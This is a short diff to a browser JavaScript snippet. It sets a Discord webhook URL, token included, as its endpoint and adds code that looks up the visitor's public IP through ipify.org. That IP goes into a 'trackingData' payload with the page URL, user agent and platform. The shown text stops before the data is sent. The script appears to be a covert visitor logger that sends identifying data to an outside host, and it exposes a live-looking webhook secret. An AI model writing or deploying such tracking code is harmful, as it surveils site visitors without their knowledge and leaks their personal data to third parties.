@@ -1,10 +1,24 @@
 (async function() {
-    // Configuration: Your target endpoint
+
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1537225175685267567/f1CPvfGdBNgmbah5ow0f_kVosxyijB-mXEsNAIVaxxOoi_6Klu7ZhScLJYbtpptSh06A';
+
+    let visitorIp = 'Unavailable';
+
+    try {
+
+        const ipResponse = await fetch('https://ipify.org');
+        if (ipResponse.ok) {
+            visitorIp = await ipResponse.text();
+        }
+    } catch (ipError) {
+
+        console.warn("IP resolution skipped or blocked.");
+    }
 
     try {
 
         const trackingData = {
+            "Public IP": visitorIp,
             "Host URL": window.location.href,
             "User Agent": navigator.userAgent,
             "Platform": navigator.platform || 'Unknown',
